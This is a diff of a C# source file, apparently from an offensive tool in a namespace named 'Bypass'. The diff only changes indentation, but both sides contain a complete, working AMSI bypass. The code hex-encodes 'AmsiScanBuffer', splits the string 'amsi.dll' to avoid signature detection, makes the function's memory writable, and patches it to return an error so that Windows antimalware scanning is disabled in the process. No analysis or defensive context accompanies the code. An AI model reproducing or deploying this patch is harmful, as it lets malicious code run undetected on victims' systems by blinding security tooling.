@@ -50,25 +50,25 @@ namespace Bypass
 
         public static int Disable()
         {
-          string hexbuffer = "41 6d 73 69 53 63 61 6e 42 75 66 66 65 72";
-	      string buffer="";
-	      string[] hexbuffersplit = hexbuffer.Split(' ');
-	      foreach (String hex in hexbuffersplit)
-          {
-              int value = Convert.ToInt32(hex, 16);
-              buffer+= Char.ConvertFromUtf32(value);
-          }
-          IntPtr Address = GetProcAddress(LoadLibrary("a"+ "msi"+ ".dl" +"l"), buffer);
-          UIntPtr size = (UIntPtr)5;
-          uint p = 0;
-          VirtualProtect(Address, size, 0x40, out p);
-          byte c1=0xB8,c2=0x80;			 
-          Byte[] Patch = {c1, 0x57, 0x00, 0x07, c2, 0xC3 };
-          IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
-          Marshal.Copy(Patch, 0, unmanagedPointer, 6);
-          MoveMemory(Address, unmanagedPointer, 6);
+            string hexbuffer = "41 6d 73 69 53 63 61 6e 42 75 66 66 65 72";
+	    string buffer="";
+	    string[] hexbuffersplit = hexbuffer.Split(' ');
+	    foreach (String hex in hexbuffersplit)
+            {
+                int value = Convert.ToInt32(hex, 16);
+                buffer+= Char.ConvertFromUtf32(value);
+            }
+            IntPtr Address = GetProcAddress(LoadLibrary("a"+ "msi"+ ".dl" +"l"), buffer);
+            UIntPtr size = (UIntPtr)5;
+            uint p = 0;
+            VirtualProtect(Address, size, 0x40, out p);
+            byte c1=0xB8,c2=0x80;			 
+            Byte[] Patch = {c1, 0x57, 0x00, 0x07, c2, 0xC3 };
+            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
+            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
+            MoveMemory(Address, unmanagedPointer, 6);
 
-          return 0;
+            return 0;
         }
     }
 }
